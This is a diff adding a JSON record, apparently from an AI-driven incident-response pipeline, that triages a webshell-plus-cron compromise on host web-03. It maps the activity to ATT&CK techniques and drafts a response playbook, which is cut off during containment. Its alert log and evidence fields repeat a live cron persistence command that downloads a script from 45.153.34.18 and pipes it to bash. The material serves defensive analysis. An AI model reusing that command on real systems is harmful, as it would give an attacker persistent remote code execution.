@@ -1,0 +1,1182 @@
+{
+ "alert": "auditd / syslog excerpt, host web-03 (Ubuntu 22.04, nginx + php-fpm)\nOct 20 22:03:11 web-03 audit: type=EXECVE argc=3 a0=\"sh\" a1=\"-c\" a2=\"(crontab -l; echo '*/5 * * * * curl -fsSL http://45.153.34.18/k.sh | bash') | crontab -\" uid=33 (www-data) ppid=1874 (php-fpm8.1)\nOct 20 22:05:00 web-03 CRON[22410]: (www-data) CMD (curl -fsSL http://45.153.34.18/k.sh | bash)\nOct 20 22:05:02 web-03 kernel: outbound connection www-data -> 45.153.34.18:80\nnginx access.log: POST /wp-content/uploads/2026/10/thumb.php 200 from 91.92.240.7",
+ "revisions": 0,
+ "steps": [
+  {
+   "node": "screen",
+   "ms": 170,
+   "score": 0.0014625743497163057,
+   "flagged": false
+  },
+  {
+   "node": "triage",
+   "model": "qwen/qwen3.8-27b",
+   "ms": 4036,
+   "input_tokens": 1306,
+   "output_tokens": 582
+  },
+  {
+   "node": "retrieve",
+   "ms": 1218,
+   "mode": "hybrid (Pinecone dense + BM25, RRF)",
+   "queries": 12
+  },
+  {
+   "node": "map_attack",
+   "model": "openai/gpt-oss-20b",
+   "ms": 1155,
+   "input_tokens": 1771,
+   "output_tokens": 192,
+   "rejected_ids": []
+  },
+  {
+   "node": "enrich",
+   "ms": 0,
+   "graph_nodes": 58
+  },
+  {
+   "node": "write_playbook",
+   "model": "openai/gpt-oss-120b",
+   "ms": 7253,
+   "input_tokens": 2996,
+   "output_tokens": 1342
+  },
+  {
+   "node": "critic",
+   "model": "qwen/qwen3.8-27b",
+   "ms": 25669,
+   "input_tokens": 2432,
+   "output_tokens": 27,
+   "verdict": "approve"
+  }
+ ],
+ "guard": {
+  "score": 0.0014625743497163057,
+  "flagged": false
+ },
+ "triage": {
+  "summary": "On web-03 (Ubuntu 22.04), the www-data user (running under php-fpm) executed a shell command that appended a crontab entry to periodically download and execute a script from 45.153.34.18. The cron job fired at 22:05, and an outbound connection to that IP was observed. The activity was preceded by a POST to a suspicious PHP file (thumb.php) in the WordPress uploads directory from 91.92.240.7, indicating a webshell was used to establish persistence.",
+  "platform": "linux",
+  "severity": "high",
+  "severity_reason": "An attacker has established persistent remote code execution via a webshell and a cron job that downloads and runs arbitrary code every 5 minutes, giving them ongoing control of the web server.",
+  "behaviors": [
+   "executing a shell command via a web application (php-fpm) to modify the user crontab",
+   "creating a scheduled task for persistence that downloads and executes a remote script",
+   "downloading a payload from a remote IP and piping it to bash",
+   "establishing an outbound network connection to a remote command-and-control server",
+   "accessing a webshell (thumb.php) in the WordPress uploads directory to execute commands"
+  ],
+  "technique_hints": [
+   "Command and Scripting Interpreter: Shell",
+   "Scheduled Task/Job: Cron",
+   "Ingress Tool Transfer",
+   "Command and Scripting Interpreter: Bash",
+   "Web Shell"
+  ],
+  "observables": {
+   "hosts": [
+    "web-03",
+    "45.153.34.18",
+    "91.92.240.7"
+   ],
+   "users": [
+    "www-data"
+   ],
+   "processes": [
+    "sh -c (crontab -l; echo '*/5 * * * * curl -fsSL http://45.153.34.18/k.sh | bash') | crontab -",
+    "curl -fsSL http://45.153.34.18/k.sh | bash",
+    "php-fpm8.1"
+   ],
+   "files": [],
+   "network": [
+    "http://45.153.34.18/k.sh",
+    "45.153.34.18:80",
+    "91.92.240.7"
+   ],
+   "registry": []
+  }
+ },
+ "candidates": [
+  {
+   "id": "T1053.003",
+   "name": "Scheduled Task/Job: Cron",
+   "tactics": [
+    "execution",
+    "persistence",
+    "privilege-escalation"
+   ],
+   "score": 1.0,
+   "sources": [
+    "name"
+   ]
+  },
+  {
+   "id": "T1105",
+   "name": "Ingress Tool Transfer",
+   "tactics": [
+    "command-and-control"
+   ],
+   "score": 1.0,
+   "sources": [
+    "name"
+   ]
+  },
+  {
+   "id": "T1505.003",
+   "name": "Server Software Component: Web Shell",
+   "tactics": [
+    "persistence"
+   ],
+   "score": 1.0,
+   "sources": [
+    "name"
+   ]
+  },
+  {
+   "id": "T1546.004",
+   "name": "Event Triggered Execution: Unix Shell Configuration Modification",
+   "tactics": [
+    "privilege-escalation",
+    "persistence"
+   ],
+   "score": 0.1527,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1202",
+   "name": "Indirect Command Execution",
+   "tactics": [
+    "stealth"
+   ],
+   "score": 0.1508,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1701.003",
+   "name": "Command and Scripting Interpreter: Unix Shell",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.1501,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.004",
+   "name": "Command and Scripting Interpreter: Unix Shell",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.1393,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.003",
+   "name": "Command and Scripting Interpreter: Windows Command Shell",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.131,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1701.002",
+   "name": "Command and Scripting Interpreter: Windows Command Shell",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.119,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059",
+   "name": "Command and Scripting Interpreter",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.1188,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1053.006",
+   "name": "Scheduled Task/Job: Systemd Timers",
+   "tactics": [
+    "execution",
+    "persistence",
+    "privilege-escalation"
+   ],
+   "score": 0.1177,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1053.002",
+   "name": "Scheduled Task/Job: At",
+   "tactics": [
+    "execution",
+    "persistence",
+    "privilege-escalation"
+   ],
+   "score": 0.1065,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1701",
+   "name": "Command and Scripting Interpreter",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.1047,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1546.005",
+   "name": "Event Triggered Execution: Trap",
+   "tactics": [
+    "privilege-escalation",
+    "persistence"
+   ],
+   "score": 0.1037,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1701.001",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0962,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1053",
+   "name": "Scheduled Task/Job",
+   "tactics": [
+    "execution",
+    "persistence",
+    "privilege-escalation"
+   ],
+   "score": 0.0921,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1053.007",
+   "name": "Scheduled Task/Job: Container Orchestration Job",
+   "tactics": [
+    "execution",
+    "persistence",
+    "privilege-escalation"
+   ],
+   "score": 0.0903,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.013",
+   "name": "Command and Scripting Interpreter: Container CLI/API",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.09,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.001",
+   "name": "Command and Scripting Interpreter: PowerShell",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0823,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.002",
+   "name": "Command and Scripting Interpreter: AppleScript",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0814,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1552.003",
+   "name": "Unsecured Credentials: Shell History",
+   "tactics": [
+    "credential-access"
+   ],
+   "score": 0.0806,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.012",
+   "name": "Command and Scripting Interpreter: Hypervisor CLI",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0666,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.005",
+   "name": "Command and Scripting Interpreter: Visual Basic",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0657,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1059.009",
+   "name": "Command and Scripting Interpreter: Cloud API",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0648,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  },
+  {
+   "id": "T1701.004",
+   "name": "Command and Scripting Interpreter: Visual Basic",
+   "tactics": [
+    "execution"
+   ],
+   "score": 0.0638,
+   "sources": [
+    "bm25",
+    "dense"
+   ]
+  }
+ ],
+ "mapping": [
+  {
+   "technique_id": "T1053.003",
+   "confidence": "high",
+   "evidence": "(crontab -l; echo '*/5 * * * * curl -fsSL http://45.153.34.18/k.sh | bash') | crontab -",
+   "name": "Scheduled Task/Job: Cron"
+  },
+  {
+   "technique_id": "T1105",
+   "confidence": "high",
+   "evidence": "curl -fsSL http://45.153.34.18/k.sh | bash",
+   "name": "Ingress Tool Transfer"
+  },
+  {
+   "technique_id": "T1505.003",
+   "confidence": "medium",
+   "evidence": "POST /wp-content/uploads/2026/10/thumb.php 200 from 91.92.240.7",
+   "name": "Server Software Component: Web Shell"
+  }
+ ],
+ "context": {
+  "techniques": [
+   {
+    "id": "T1053.003",
+    "name": "Scheduled Task/Job: Cron",
+    "url": "https://attack.mitre.org/techniques/T1053/003/",
+    "domain": "enterprise",
+    "tactics": [
+     "execution",
+     "persistence",
+     "privilege-escalation"
+    ],
+    "platforms": [
+     "Linux",
+     "macOS",
+     "ESXi"
+    ],
+    "description": "Adversaries may abuse the cron utility to perform task scheduling for initial or recurring execution of malicious code. The cron utility is a time-based job scheduler for Unix-like operating systems. The crontab file contains the schedule of cron entries to be run and the specified times for execution. Any crontab files are stored in operating system-specific file paths. An adversary may use cron in Linux or Unix environments to execute programs at system startup or on a scheduled basis for Persistence. In ESXi environments, cron jobs must be created directly via the crontab file (e.g., `/var/spool/cron/crontabs/root`).",
+    "parent": "T1053",
+    "used_by": 19,
+    "mitigations": [
+     {
+      "id": "M1018",
+      "name": "User Account Management",
+      "description": "User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation. Proper account management reduces the attack surface by limiting unauthorized access, managing account privileges, and ensuring accounts are used according to organizational policies.",
+      "url": "https://attack.mitre.org/mitigations/M1018/"
+     },
+     {
+      "id": "M1047",
+      "name": "Audit",
+      "description": "Auditing is the process of recording activity and systematically reviewing and analyzing the activity and system configurations. The primary purpose of auditing is to detect anomalies and identify potential threats or weaknesses in the environment. Proper auditing configurations can also help to meet compliance requirements.",
+      "url": "https://attack.mitre.org/mitigations/M1047/"
+     }
+    ],
+    "detections": [
+     {
+      "id": "DET0290",
+      "name": "Cross-Platform Detection of Cron Job Abuse for Persistence and Execution",
+      "analytics": [
+       {
+        "platforms": [
+         "Linux"
+        ],
+        "description": "Detects creation or modification of crontab entries by non-root users or from abnormal parent processes, followed by the execution of uncommon binaries at scheduled intervals.",
+        "log_sources": [
+         "auditd:SYSCALL"
+        ]
+       },
+       {
+        "platforms": [
+         "macOS"
+        ],
+        "description": "Detects crontab job additions or modifications via `crontab` utility or direct edits, especially those created by interactive users executing hidden or renamed scripts.",
+        "log_sources": [
+         "fs:fsusage",
+         "macos:unifiedlog"
+        ]
+       },
+       {
+        "platforms": [
+         "ESXi"
+        ],
+        "description": "Detects direct modification of crontab entries in /var/spool/cron/crontabs/root or /etc/rc.local.d/local.sh followed by execution of scripts linked to lateral movement or malware persistence.",
+        "log_sources": [
+         "esxi:cron",
+         "esxi:hostd",
+         "esxi:vmkernel"
+        ]
+       }
+      ],
+      "url": "https://attack.mitre.org/detectionstrategies/DET0290/"
+     }
+    ],
+    "d3fend": {
+     "Detect": [
+      {
+       "id": "D3-PLA",
+       "name": "Process Lineage Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessLineageAnalysis/"
+      },
+      {
+       "id": "D3-PSA",
+       "name": "Process Spawn Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/"
+      },
+      {
+       "id": "D3-PSMD",
+       "name": "Process Self-Modification Detection",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessSelf-ModificationDetection/"
+      },
+      {
+       "id": "D3-SCA",
+       "name": "System Call Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:SystemCallAnalysis/"
+      },
+      {
+       "id": "D3-SDM",
+       "name": "System Daemon Monitoring",
+       "url": "https://d3fend.mitre.org/technique/d3f:SystemDaemonMonitoring/"
+      },
+      {
+       "id": "D3-SJA",
+       "name": "Scheduled Job Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:ScheduledJobAnalysis/"
+      }
+     ],
+     "Isolate": [
+      {
+       "id": "D3-ABPI",
+       "name": "Application-based Process Isolation",
+       "url": "https://d3fend.mitre.org/technique/d3f:Application-basedProcessIsolation/"
+      },
+      {
+       "id": "D3-EAL",
+       "name": "Executable Allowlisting",
+       "url": "https://d3fend.mitre.org/technique/d3f:ExecutableAllowlisting/"
+      },
+      {
+       "id": "D3-EDL",
+       "name": "Executable Denylisting",
+       "url": "https://d3fend.mitre.org/technique/d3f:ExecutableDenylisting/"
+      },
+      {
+       "id": "D3-HBPI",
+       "name": "Hardware-based Process Isolation",
+       "url": "https://d3fend.mitre.org/technique/d3f:Hardware-basedProcessIsolation/"
+      },
+      {
+       "id": "D3-KBPI",
+       "name": "Kernel-based Process Isolation",
+       "url": "https://d3fend.mitre.org/technique/d3f:Kernel-basedProcessIsolation/"
+      },
+      {
+       "id": "D3-SCF",
+       "name": "System Call Filtering",
+       "url": "https://d3fend.mitre.org/technique/d3f:SystemCallFiltering/"
+      }
+     ],
+     "Evict": [
+      {
+       "id": "D3-HR",
+       "name": "Host Reboot",
+       "url": "https://d3fend.mitre.org/technique/d3f:HostReboot/"
+      },
+      {
+       "id": "D3-HS",
+       "name": "Host Shutdown",
+       "url": "https://d3fend.mitre.org/technique/d3f:HostShutdown/"
+      },
+      {
+       "id": "D3-PS",
+       "name": "Process Suspension",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessSuspension/"
+      },
+      {
+       "id": "D3-PT",
+       "name": "Process Termination",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessTermination/"
+      }
+     ]
+    }
+   },
+   {
+    "id": "T1105",
+    "name": "Ingress Tool Transfer",
+    "url": "https://attack.mitre.org/techniques/T1105/",
+    "domain": "enterprise",
+    "tactics": [
+     "command-and-control"
+    ],
+    "platforms": [
+     "ESXi",
+     "Linux",
+     "macOS",
+     "Network Devices",
+     "Windows"
+    ],
+    "description": "Adversaries may transfer tools or other files from an external system into a compromised environment. Tools or files may be copied from an external adversary-controlled system to the victim network through the command and control channel or through alternate protocols such as ftp. Once present, adversaries may also transfer/spread tools between victim devices within a compromised environment (i.e. Lateral Tool Transfer). On Windows, adversaries may use various utilities to download tools, such as `copy`, `finger`, certutil, and PowerShell commands such as IEX(New-Object Net.WebClient).downloadString() and Invoke-WebRequest. On Linux and macOS systems, a variety of utilities also exist, such as `curl`, `scp`, `sftp`, `tftp`, `rsync`, `finger`, and `wget`. A number of these tools, such as `wget`, `curl`, and `scp`, also exist on ESXi.",
+    "parent": null,
+    "used_by": 531,
+    "mitigations": [
+     {
+      "id": "M1031",
+      "name": "Network Intrusion Prevention",
+      "description": "Use intrusion detection signatures to block traffic at network boundaries.",
+      "url": "https://attack.mitre.org/mitigations/M1031/"
+     },
+     {
+      "id": "M1037",
+      "name": "Filter Network Traffic",
+      "description": "Employ network appliances and endpoint software to filter ingress, egress, and lateral network traffic. This includes protocol-based filtering, enforcing firewall rules, and blocking or restricting traffic based on predefined conditions to limit adversary movement and data exfiltration.",
+      "url": "https://attack.mitre.org/mitigations/M1037/"
+     }
+    ],
+    "detections": [
+     {
+      "id": "DET0060",
+      "name": "Detect Ingress Tool Transfers via Behavioral Chain",
+      "analytics": [
+       {
+        "platforms": [
+         "Windows"
+        ],
+        "description": "Unusual or uncommon processes initiate network connections to external destinations followed by file creation (tools downloaded).",
+        "log_sources": [
+         "WinEventLog:Sysmon"
+        ]
+       },
+       {
+        "platforms": [
+         "Linux"
+        ],
+        "description": "Shell-based tools (curl, wget, scp) initiate connections to external domains followed by creation of executable files on disk.",
+        "log_sources": [
+         "auditd:SYSCALL",
+         "iptables:LOG"
+        ]
+       },
+       {
+        "platforms": [
+         "macOS"
+        ],
+        "description": "Process execution of curl or wget followed by a network connection and a file created in temporary or user-specific directories.",
+        "log_sources": [
+         "macos:endpointsecurity",
+         "macos:unifiedlog"
+        ]
+       },
+       {
+        "platforms": [
+         "ESXi"
+        ],
+        "description": "Command line interface or vCLI triggers remote transfer using wget or curl, writing files into datastore paths or local tmp directories.",
+        "log_sources": [
+         "esxi:hostd",
+         "esxi:vmkernel"
+        ]
+       }
+      ],
+      "url": "https://attack.mitre.org/detectionstrategies/DET0060/"
+     }
+    ],
+    "d3fend": {
+     "Detect": [
+      {
+       "id": "D3-APCA",
+       "name": "Application Protocol Command Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:ApplicationProtocolCommandAnalysis/"
+      },
+      {
+       "id": "D3-CSPP",
+       "name": "Client-server Payload Profiling",
+       "url": "https://d3fend.mitre.org/technique/d3f:Client-serverPayloadProfiling/"
+      },
+      {
+       "id": "D3-NTCD",
+       "name": "Network Traffic Community Deviation",
+       "url": "https://d3fend.mitre.org/technique/d3f:NetworkTrafficCommunityDeviation/"
+      },
+      {
+       "id": "D3-NTSA",
+       "name": "Network Traffic Signature Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:NetworkTrafficSignatureAnalysis/"
+      },
+      {
+       "id": "D3-PHDURA",
+       "name": "Per Host Download-Upload Ratio Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:PerHostDownload-UploadRatioAnalysis/"
+      },
+      {
+       "id": "D3-PMAD",
+       "name": "Protocol Metadata Anomaly Detection",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProtocolMetadataAnomalyDetection/"
+      },
+      {
+       "id": "D3-RPA",
+       "name": "Relay Pattern Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:RelayPatternAnalysis/"
+      },
+      {
+       "id": "D3-RTSD",
+       "name": "Remote Terminal Session Detection",
+       "url": "https://d3fend.mitre.org/technique/d3f:RemoteTerminalSessionDetection/"
+      },
+      {
+       "id": "D3-UGLPA",
+       "name": "User Geolocation Logon Pattern Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:UserGeolocationLogonPatternAnalysis/"
+      }
+     ],
+     "Isolate": [
+      {
+       "id": "D3-NTF",
+       "name": "Network Traffic Filtering",
+       "url": "https://d3fend.mitre.org/technique/d3f:NetworkTrafficFiltering/"
+      },
+      {
+       "id": "D3-OTF",
+       "name": "Outbound Traffic Filtering",
+       "url": "https://d3fend.mitre.org/technique/d3f:OutboundTrafficFiltering/"
+      }
+     ]
+    }
+   },
+   {
+    "id": "T1505.003",
+    "name": "Server Software Component: Web Shell",
+    "url": "https://attack.mitre.org/techniques/T1505/003/",
+    "domain": "enterprise",
+    "tactics": [
+     "persistence"
+    ],
+    "platforms": [
+     "Linux",
+     "macOS",
+     "Network Devices",
+     "Windows"
+    ],
+    "description": "Adversaries may backdoor web servers with web shells to establish persistent access to systems. A Web shell is a Web script that is placed on an openly accessible Web server to allow an adversary to access the Web server as a gateway into a network. A Web shell may provide a set of functions to execute or a command-line interface on the system that hosts the Web server. In addition to a server-side script, a Web shell may have a client interface program that is used to talk to the Web server (e.g. China Chopper Web shell client).",
+    "parent": "T1505",
+    "used_by": 67,
+    "mitigations": [
+     {
+      "id": "M1018",
+      "name": "User Account Management",
+      "description": "User Account Management involves implementing and enforcing policies for the lifecycle of user accounts, including creation, modification, and deactivation. Proper account management reduces the attack surface by limiting unauthorized access, managing account privileges, and ensuring accounts are used according to organizational policies.",
+      "url": "https://attack.mitre.org/mitigations/M1018/"
+     },
+     {
+      "id": "M1042",
+      "name": "Disable or Remove Feature or Program",
+      "description": "Disable or remove unnecessary and potentially vulnerable software, features, or services to reduce the attack surface and prevent abuse by adversaries. This involves identifying software or features that are no longer needed or that could be exploited and ensuring they are either removed or properly disabled.",
+      "url": "https://attack.mitre.org/mitigations/M1042/"
+     }
+    ],
+    "detections": [
+     {
+      "id": "DET0394",
+      "name": "Web Shell Detection via Server Behavior and File Execution Chains",
+      "analytics": [
+       {
+        "platforms": [
+         "Windows"
+        ],
+        "description": "Unexpected file creation in web directories followed by web server processes (e.g., w3wp.exe) spawning command shells or script interpreters (e.g., cmd.exe, powershell.exe)",
+        "log_sources": [
+         "NSM:Flow",
+         "WinEventLog:Security",
+         "WinEventLog:Sysmon"
+        ]
+       },
+       {
+        "platforms": [
+         "Linux"
+        ],
+        "description": "File creation of unauthorized script (e.g., .php, .sh) in /var/www/html followed by execution of unexpected system utilities (e.g., curl, bash, nc) by apache/nginx",
+        "log_sources": [
+         "NSM:Flow",
+         "auditd:SYSCALL"
+        ]
+       },
+       {
+        "platforms": [
+         "macOS"
+        ],
+        "description": "Web servers (e.g., httpd) spawning abnormal processes post file upload into /Library/WebServer/Documents or /usr/local/var/www",
+        "log_sources": [
+         "auditd:SYSCALL",
+         "macos:unifiedlog"
+        ]
+       }
+      ],
+      "url": "https://attack.mitre.org/detectionstrategies/DET0394/"
+     }
+    ],
+    "d3fend": {
+     "Detect": [
+      {
+       "id": "D3-DA",
+       "name": "Dynamic Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:DynamicAnalysis/"
+      },
+      {
+       "id": "D3-EFA",
+       "name": "Emulated File Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:EmulatedFileAnalysis/"
+      },
+      {
+       "id": "D3-EHB",
+       "name": "Endpoint Health Beacon",
+       "url": "https://d3fend.mitre.org/technique/d3f:EndpointHealthBeacon/"
+      },
+      {
+       "id": "D3-FA",
+       "name": "File Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:FileAnalysis/"
+      },
+      {
+       "id": "D3-FIM",
+       "name": "File Integrity Monitoring",
+       "url": "https://d3fend.mitre.org/technique/d3f:FileIntegrityMonitoring/"
+      },
+      {
+       "id": "D3-PLA",
+       "name": "Process Lineage Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessLineageAnalysis/"
+      },
+      {
+       "id": "D3-PSA",
+       "name": "Process Spawn Analysis",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessSpawnAnalysis/"
+      },
+      {
+       "id": "D3-PSMD",
+       "name": "Process Self-Modification Detection",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessSelf-ModificationDetection/"
+      }
+     ],
+     "Isolate": [
+      {
+       "id": "D3-ABPI",
+       "name": "Application-based Process Isolation",
+       "url": "https://d3fend.mitre.org/technique/d3f:Application-basedProcessIsolation/"
+      },
+      {
+       "id": "D3-CF",
+       "name": "Content Filtering",
+       "url": "https://d3fend.mitre.org/technique/d3f:ContentFiltering/"
+      },
+      {
+       "id": "D3-CM",
+       "name": "Content Modification",
+       "url": "https://d3fend.mitre.org/technique/d3f:ContentModification/"
+      },
+      {
+       "id": "D3-CQ",
+       "name": "Content Quarantine",
+       "url": "https://d3fend.mitre.org/technique/d3f:ContentQuarantine/"
+      },
+      {
+       "id": "D3-EAL",
+       "name": "Executable Allowlisting",
+       "url": "https://d3fend.mitre.org/technique/d3f:ExecutableAllowlisting/"
+      },
+      {
+       "id": "D3-EDL",
+       "name": "Executable Denylisting",
+       "url": "https://d3fend.mitre.org/technique/d3f:ExecutableDenylisting/"
+      },
+      {
+       "id": "D3-HBPI",
+       "name": "Hardware-based Process Isolation",
+       "url": "https://d3fend.mitre.org/technique/d3f:Hardware-basedProcessIsolation/"
+      },
+      {
+       "id": "D3-KBPI",
+       "name": "Kernel-based Process Isolation",
+       "url": "https://d3fend.mitre.org/technique/d3f:Kernel-basedProcessIsolation/"
+      },
+      {
+       "id": "D3-LFP",
+       "name": "Local File Permissions",
+       "url": "https://d3fend.mitre.org/technique/d3f:LocalFilePermissions/"
+      },
+      {
+       "id": "D3-RFAM",
+       "name": "Remote File Access Mediation",
+       "url": "https://d3fend.mitre.org/technique/d3f:RemoteFileAccessMediation/"
+      },
+      {
+       "id": "D3-SCF",
+       "name": "System Call Filtering",
+       "url": "https://d3fend.mitre.org/technique/d3f:SystemCallFiltering/"
+      }
+     ],
+     "Evict": [
+      {
+       "id": "D3-FEV",
+       "name": "File Eviction",
+       "url": "https://d3fend.mitre.org/technique/d3f:FileEviction/"
+      },
+      {
+       "id": "D3-HR",
+       "name": "Host Reboot",
+       "url": "https://d3fend.mitre.org/technique/d3f:HostReboot/"
+      },
+      {
+       "id": "D3-HS",
+       "name": "Host Shutdown",
+       "url": "https://d3fend.mitre.org/technique/d3f:HostShutdown/"
+      },
+      {
+       "id": "D3-PS",
+       "name": "Process Suspension",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessSuspension/"
+      },
+      {
+       "id": "D3-PT",
+       "name": "Process Termination",
+       "url": "https://d3fend.mitre.org/technique/d3f:ProcessTermination/"
+      }
+     ],
+     "Restore": [
+      {
+       "id": "D3-RF",
+       "name": "Restore File",
+       "url": "https://d3fend.mitre.org/technique/d3f:RestoreFile/"
+      },
+      {
+       "id": "D3-RNA",
+       "name": "Restore Network Access",
+       "url": "https://d3fend.mitre.org/technique/d3f:RestoreNetworkAccess/"
+      }
+     ],
+     "Harden": [
+      {
+       "id": "D3-FE",
+       "name": "File Encryption",
+       "url": "https://d3fend.mitre.org/technique/d3f:FileEncryption/"
+      }
+     ],
+     "Deceive": [
+      {
+       "id": "D3-DF",
+       "name": "Decoy File",
+       "url": "https://d3fend.mitre.org/technique/d3f:DecoyFile/"
+      }
+     ],
+     "Model": [
+      {
+       "id": "D3-LLM",
+       "name": "Logical Link Mapping",
+       "url": "https://d3fend.mitre.org/technique/d3f:LogicalLinkMapping/"
+      },
+      {
+       "id": "D3-NNI",
+       "name": "Network Node Inventory",
+       "url": "https://d3fend.mitre.org/technique/d3f:NetworkNodeInventory/"
+      },
+      {
+       "id": "D3-PLM",
+       "name": "Physical Link Mapping",
+       "url": "https://d3fend.mitre.org/technique/d3f:PhysicalLinkMapping/"
+      }
+     ]
+    }
+   }
+  ],
+  "allowed_refs": [
+   "D3-ABPI",
+   "D3-APCA",
+   "D3-CF",
+   "D3-CM",
+   "D3-CQ",
+   "D3-CSPP",
+   "D3-DA",
+   "D3-DF",
+   "D3-EAL",
+   "D3-EDL",
+   "D3-EFA",
+   "D3-EHB",
+   "D3-FA",
+   "D3-FE",
+   "D3-FEV",
+   "D3-FIM",
+   "D3-HBPI",
+   "D3-HR",
+   "D3-HS",
+   "D3-KBPI",
+   "D3-LFP",
+   "D3-LLM",
+   "D3-NNI",
+   "D3-NTCD",
+   "D3-NTF",
+   "D3-NTSA",
+   "D3-OTF",
+   "D3-PHDURA",
+   "D3-PLA",
+   "D3-PLM",
+   "D3-PMAD",
+   "D3-PS",
+   "D3-PSA",
+   "D3-PSMD",
+   "D3-PT",
+   "D3-RF",
+   "D3-RFAM",
+   "D3-RNA",
+   "D3-RPA",
+   "D3-RTSD",
+   "D3-SCA",
+   "D3-SCF",
+   "D3-SDM",
+   "D3-SJA",
+   "D3-UGLPA",
+   "DET0060",
+   "DET0290",
+   "DET0394",
+   "M1018",
+   "M1031",
+   "M1037",
+   "M1042",
+   "M1047",
+   "T1053",
+   "T1053.003",
+   "T1105",
+   "T1505",
+   "T1505.003"
+  ]
+ },
+ "playbook": {
+  "title": "Response Playbook for Persistent Web Shell and Cron Job on web-03",
+  "executive_summary": "A web shell (thumb.php) was used to add a cron job under www-data that repeatedly downloads and executes a script from 45.153.34.18. The attacker has persistent remote code execution on web-03. Immediate containment, evidence collection, and removal of the web shell and cron entry are required, followed by system hardening.",
+  "detection_and_analysis": [
+   {
+    "action": "Collect volatile memory and process list from web-03",
+    "detail": "Use liME or similar to capture RAM, then list running processes (ps aux) focusing on www-data, sh, curl, and php-fpm8.1 to capture in\u2011memory artifacts of the downloaded script.",
+    "references": []
+   },
+   {
+    "action": "Gather auditd and syslog entries around the time of the incident",
+    "detail": "Query auditd:SYSCALL for EXECVE events where uid=33 and parent pid=1874, and syslog for cron executions. Correlate with DET0290 detection of cron abuse.",
+    "references": [
+     "DET0290"
+    ]
+   },
+   {
+    "action": "Identify and hash the malicious script and web shell files",
+    "detail": "Locate /var/www/html/wp-content/uploads/2026/10/thumb.php and any files created by the cron job (e.g., k.sh). Compute SHA256 hashes for later verification.",
+    "references": [
+     "DET0394"
+    ]
+   },
+   {
+    "action": "Review network traffic logs for outbound connections to 45.153.34.18",
+    "detail": "Search firewall/iptables:LOG and NSM:Flow for HTTP GETs from www-data or curl to 45.153.34.18:80 during the window.",
+    "references": [
+     "DET0060"
+    ]
+   }
+  ],
+  "containment": [
+   {
+    "action": "Isolate web-03 from the internal network",
+    "detail": "Place the host in a quarantine VLAN or apply a host\u2011based firewall rule blocking all outbound traffic except to internal services.",
+    "references": [
+     "D3-NTF"
+    ]
+   },
+   {
+    "action": "Terminate malicious processes",
+    "detail": "Use kill -9 on the specific curl and bash processes spawned by the cron job, then suspend php-fpm workers serving thumb.php.",
+    "references": [
+     "D3-PT"
+    ]
+   },
+   {
+    "action": "Disable the compromised cron entry",
+    "detail": "Edit www-data's crontab (crontab -u www-data -e) to remove the line containing curl -fsSL http://45.153.34.18/k.sh.",
